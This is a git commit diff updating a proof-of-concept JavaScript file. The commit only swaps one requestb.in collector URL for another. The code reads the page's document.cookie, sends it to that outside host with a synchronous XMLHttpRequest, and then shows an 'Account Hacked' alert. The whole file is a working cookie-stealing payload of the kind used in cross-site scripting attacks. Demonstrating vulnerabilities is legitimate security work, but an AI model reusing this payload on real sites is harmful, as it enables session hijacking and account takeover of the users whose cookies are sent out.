c1e648d87428f2a57b16dd2c4a9b8953f0998bcb
shy71 <shy71@users.noreply.github.com>
2017-11-29 19:52:20 +0200

    Update PoC.js

--- PoC.js
+++ PoC.js
@@ -1,5 +1,5 @@
 var xmlHttp = new XMLHttpRequest();
-xmlHttp.open( "GET", "https://requestb.in/vfdi86vf?cookie="+JSON.stringify(document.cookie), false );
+xmlHttp.open( "GET", "https://requestb.in/1i0zvsq1?cookie="+JSON.stringify(document.cookie), false );
 xmlHttp.send( null );
 alert('Account Hacked')
 
